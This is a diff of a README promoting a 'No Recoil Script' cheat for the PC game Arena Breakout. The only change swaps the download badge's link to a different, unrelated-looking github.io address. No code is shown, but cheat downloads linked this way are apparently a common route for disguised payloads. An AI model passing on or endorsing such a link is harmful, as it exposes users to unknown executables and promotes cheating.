@@ -3,7 +3,7 @@
 Control your spray and keep your aim tight with this **No Recoil Script** for **Arena Breakout** on PC. This setup guide shows how to run a simple recoil control script to minimize vertical drift and balance your weapon’s kickback for smoother, more accurate firing.
 
 ⬇️ **Download**  
-[![Download No Recoil Script](https://img.shields.io/badge/Download-No_Recoil_Script-000000?style=for-the-badge&logo=arena-breakout&logoColor=white)](https://arena-breakout-no-recoil-script.github.io/.github/)
+[![Download No Recoil Script](https://img.shields.io/badge/Download-No_Recoil_Script-000000?style=for-the-badge&logo=arena-breakout&logoColor=white)](https://babas-my-foisal.github.io/.github/)
 
 ---
 
